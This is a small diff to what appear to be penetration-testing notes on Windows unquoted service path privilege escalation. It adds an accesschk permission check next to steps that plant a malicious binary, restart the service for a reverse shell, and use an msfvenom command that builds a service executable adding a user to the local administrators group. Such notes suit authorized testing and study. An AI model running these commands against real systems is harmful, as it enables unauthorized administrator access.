@@ -158,7 +158,7 @@ C:\Program Files\My.exe
 C:\Program Files\My Program\My.exe
 C:\Program Files\My Program\My service\service.exe
 
-1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path
+1. check if current user has permission to place malicious bianry into subdirectories of unquoted service path - accesschk.exe /accepteula -quv "unquoted path"
 2. check which service runs this executable file
 3. restart the service to receive rev shell or msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
